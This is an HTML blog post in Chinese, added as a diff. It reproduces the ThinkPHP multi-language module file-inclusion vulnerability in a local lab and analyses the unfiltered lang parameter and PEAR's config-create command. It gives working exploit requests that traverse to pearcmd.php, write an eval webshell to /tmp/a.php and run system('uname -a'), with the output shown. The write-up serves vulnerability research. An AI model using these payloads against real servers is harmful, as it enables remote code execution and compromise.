@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>ThinkPHP多语言模块文件包含漏洞 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期四, 一月 26日 2023, 10:45 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      11 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul>
+<li><p>v6.0.1 &lt; Thinkphp &lt; v6.0.13</p>
+</li>
+<li><p>Thinkphp v5.0.x</p>
+</li>
+<li><p>Thinkphp v5.1.x</p>
+</li>
+</ul>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用composer安装时无法安装历史版本，所以直接去<a href="https://github.com/top-think/think/tree/v6.0.12">GitHub</a>下载6.0.12版本。</p>
+<p>然后解压到&#x2F;var&#x2F;www&#x2F;html，再修改一下composer.json里面配置的framework版本为6.0.12：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=7.2.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6.0.12&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/think-orm&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>然后运行composer install完成安装，可以使用ThinkPHP6.0.12。</p>
+<p>最后开启多语言配置，修改app&#x2F;middleware.php，将这一行去掉注释：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 多语言加载</span></span><br><span class="line">\think\middleware<span class="title class_">\LoadLangPack</span>::<span class="variable language_">class</span>,</span><br></pre></td></tr></table></figure>
+
+<p>按理来说漏洞应该已经可以利用了，但是打不通，看代理也看不出什么东西来，所以直接上xdebug远程调试。</p>
+<p>APT安装的xdebug3会有兼容性问题，一些配置已经变更了，如remote_port等配置，在phpinfo里已经显示为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(setting renamed in Xdebug 3)	</span><br></pre></td></tr></table></figure>
+
+<p>看起来换了个名字，所以选择<a href="https://xdebug.org/download/historical">手动下载</a>编译安装，然而它又要php7。</p>
+<p>太麻烦了，但是docker镜像有网络问题，只能开个vultr把镜像打包回来了。</p>
+<p>先安装dockers.io，然后下载php镜像：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull php:7.4-apache</span><br></pre></td></tr></table></figure>
+
+<p>打包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save 20a3732f422b &gt; php74.tar</span><br></pre></td></tr></table></figure>
+
+<p>通过sz命令和xshell下载到本地后导入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; php74.tar </span><br></pre></td></tr></table></figure>
+
+<p>启动镜像，换源<a href="https://xdebug.org/docs/install">安装xdebug</a>修改php.ini并重启，在phpinfo看到xdebug消息后再配置好phpstorm的调试端口、文件映射和远程服务器就好了。</p>
+<p>可以看到，文件包含的路径为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/think-6.0.12/vendor/topthink/framework/src/lang/test.php</span><br></pre></td></tr></table></figure>
+
+<p>看来确实是可以利用的，只是要跳的目录比想象的要多而已：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.88.129/think-6.0.12/public/?lang=../../../../../test&amp;XDEBUG_SESSION_START=13537</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>看起来是多语言环境下通过直接文件包含的方式引入对应语言的语言包。</p>
+<p>由于没有做目录跳转过滤，所以导致了文件包含漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>详见参考文章，docker环境&#x2F;register_argc_argv开启且环境存在pear的情况下可以通过pear写入文件并包含。</p>
+<p>pear文件位于&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php，可以看到首先使用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$argv</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">readPHPArgv</span>();</span><br></pre></td></tr></table></figure>
+
+<p>获取输入参数，即：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说通过$_SERVER[‘argv’]可控，然后做了一系列更多的处理，比如通过array_shift删除了第一个元素：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_shift</span>(<span class="variable">$argv</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此外，根据参考文章，可以知道$_SERVER[‘argv’]截取参数的方式跟一般URL截取不一样，是用+截断的。所以可以将lang等无关参数放在前面用+截断，这样就不会影响利用了。</p>
+<p>pear的config-create命令可以用于创建新文件，该命令的输入参数可以在PEAR&#x2F;Command&#x2F;Config.php里面找到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;config-create&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;summary&#x27;</span> =&gt; <span class="string">&#x27;Create a Default configuration file&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;function&#x27;</span> =&gt; <span class="string">&#x27;doConfigCreate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;shortcut&#x27;</span> =&gt; <span class="string">&#x27;coc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;options&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;windows&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;shortopt&#x27;</span> =&gt; <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;doc&#x27;</span> =&gt; <span class="string">&#x27;create a config file for a windows install&#x27;</span>,</span><br><span class="line">            ),</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&#x27;doc&#x27;</span> =&gt; <span class="string">&#x27;&lt;root path&gt; &lt;filename&gt;</span></span><br><span class="line"><span class="string">Create a default configuration file with all directory configuration</span></span><br><span class="line"><span class="string">variables set to subdirectories of &lt;root path&gt;, and save it as &lt;filename&gt;.</span></span><br><span class="line"><span class="string">This is useful especially for creating a configuration file for a remote</span></span><br><span class="line"><span class="string">PEAR installation (using the --remoteconfig option of install, upgrade,</span></span><br><span class="line"><span class="string">and uninstall).</span></span><br><span class="line"><span class="string">&#x27;</span>,</span><br><span class="line">    ),</span><br></pre></td></tr></table></figure>
+
+<p>只有两个参数，第一个参数为写入文件路径，第二个为文件名，暂时不清楚文件内容要怎么控制。</p>
+<p>找到具体的写入函数doConfigCreate：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$params</span>) != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&#x27;config-create: must have 2 parameters, root path and &#x27;</span> .</span><br><span class="line">        <span class="string">&#x27;filename to save as&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先限制参数数量为2，然后：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$root</span> = <span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// Clean up the DIRECTORY_SEPARATOR mess</span></span><br><span class="line"><span class="variable">$ds2</span> = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR;</span><br><span class="line"><span class="variable">$root</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;!\\\\+!&#x27;</span>, <span class="string">&#x27;!/+!&#x27;</span>, <span class="string">&quot;!<span class="subst">$ds2</span>+!&quot;</span>),</span><br><span class="line">                      <span class="keyword">array</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">                    <span class="variable">$root</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$root</span>[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;windows&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&#x27;Root directory must be an absolute path beginning &#x27;</span> .</span><br><span class="line">            <span class="string">&#x27;with &quot;/&quot;, was: &quot;&#x27;</span> . <span class="variable">$root</span> . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]:/&#x27;</span>, <span class="variable">$root</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&#x27;Root directory must be an absolute path beginning &#x27;</span> .</span><br><span class="line">            <span class="string">&#x27;with &quot;\\&quot; or &quot;C:\\&quot;, was: &quot;&#x27;</span> . <span class="variable">$root</span> . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数要以&#x2F;开头，不然就会有正则表达式的校验。然后开始写入文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">noRegistry</span>();</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;php_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\php&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/php&quot;</span>, <span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;data_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\data&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/data&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;www_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\www&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/www&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;cfg_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\cfg&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/cfg&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;ext_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\ext&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/ext&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;doc_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\docs&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/docs&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;test_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\tests&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/tests&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;cache_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\cache&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/cache&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;download_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\download&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/download&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;temp_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\temp&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/temp&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;bin_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;man_dir&#x27;</span>, <span class="variable">$windows</span> ? <span class="string">&quot;<span class="subst">$root</span>\\pear\\man&quot;</span> : <span class="string">&quot;<span class="subst">$root</span>/pear/man&quot;</span>);</span><br><span class="line"><span class="variable">$config</span>-&gt;<span class="title function_ invoke__">writeConfigFile</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_showConfig</span>(<span class="variable">$config</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;ui-&gt;<span class="title function_ invoke__">outputData</span>(<span class="string">&#x27;Successfully created default configuration file &quot;&#x27;</span> . <span class="variable">$params</span>[<span class="number">1</span>] . <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">    <span class="variable">$command</span>);</span><br></pre></td></tr></table></figure>
+
+<p>将第一个参数写入了第二个参数代表的文件里，所以第一个参数实际上就是文件内容。</p>
+<p>简单测试一下，访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.88.129/think-6.0.12/public/?lang=../../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/Twings+/tmp/a.php</span><br></pre></td></tr></table></figure>
+
+<p>可以看到&#x2F;tmp&#x2F;a.php里面写入了多次第一个参数，实际上是一个PHP序列化数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#PEAR_Config 0.9</span><br><span class="line">a:12:&#123;s:7:&quot;php_dir&quot;;s:16:&quot;/Twings/pear/php&quot;;s:8:&quot;data_dir&quot;;s:17:&quot;/Twings/pear/data&quot;;s:7:&quot;www_dir&quot;;s:16:&quot;/Twings/pear/www&quot;;s:7:&quot;cfg_dir&quot;;s:16:&quot;/Twings/pear/cfg&quot;;s:7:&quot;ext_dir&quot;;s:16:&quot;/Twings/pear/ext&quot;;s:7:&quot;doc_dir&quot;;s:17:&quot;/Twings/pear/docs&quot;;s:8:&quot;test_dir&quot;;s:18:&quot;/Twings/pear/tests&quot;;s:9:&quot;cache_dir&quot;;s:18:&quot;/Twings/pear/cache&quot;;s:12:&quot;download_dir&quot;;s:21:&quot;/Twings/pear/download&quot;;s:8:&quot;temp_dir&quot;;s:17:&quot;/Twings/pear/temp&quot;;s:7:&quot;bin_dir&quot;;s:12:&quot;/Twings/pear&quot;;s:7:&quot;man_dir&quot;;s:16:&quot;/Twings/pear/man&quot;;&#125;root@aa22a86de98a:/usr/local/lib/php# </span><br></pre></td></tr></table></figure>
+
+<p>然后写入一句话，为了防止浏览器自动编码，使用BP发包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/think-6.0.12/public/?lang=../../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;+/tmp/a.php</span><br></pre></td></tr></table></figure>
+
+<p>写入成功，最后包含利用就行了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/think-6.0.12/public/?lang=../../../../../../../../../tmp/a&amp;cmd=system(&#x27;uname%20-a&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#PEAR_Config 0.9</span><br><span class="line">a:13:&#123;s:7:&quot;php_dir&quot;;s:39:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/php&quot;;s:8:&quot;data_dir&quot;;s:40:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/data&quot;;s:7:&quot;www_dir&quot;;s:39:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/www&quot;;s:7:&quot;cfg_dir&quot;;s:39:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/cfg&quot;;s:7:&quot;ext_dir&quot;;s:39:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/ext&quot;;s:7:&quot;doc_dir&quot;;s:40:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/docs&quot;;s:8:&quot;test_dir&quot;;s:41:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/tests&quot;;s:9:&quot;cache_dir&quot;;s:41:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/cache&quot;;s:12:&quot;download_dir&quot;;s:44:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/download&quot;;s:8:&quot;temp_dir&quot;;s:40:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/temp&quot;;s:7:&quot;bin_dir&quot;;s:35:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear&quot;;s:7:&quot;man_dir&quot;;s:39:&quot;/Linux aa22a86de98a 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 GNU/Linux</span><br><span class="line">/pear/man&quot;;s:10:&quot;__channels&quot;;a:2:&#123;s:12:&quot;pecl.php.net&quot;;a:0:&#123;&#125;s:5:&quot;__uri&quot;;a:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/352154.html">ThinkPHP V6.0.12LTS多语言模块RCE</a></p>
+<p><a href="https://www.szfangwei.cn/news/6532.html">ThinkPHP6如何实现多语言网站搭建</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述</a></p>
+<p><a href="https://blog.csdn.net/m0_62422842/article/details/126772725">利用pearcmd.php文件包含拿shell（LFI）</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                  </span>
+                
+              </p>
+              
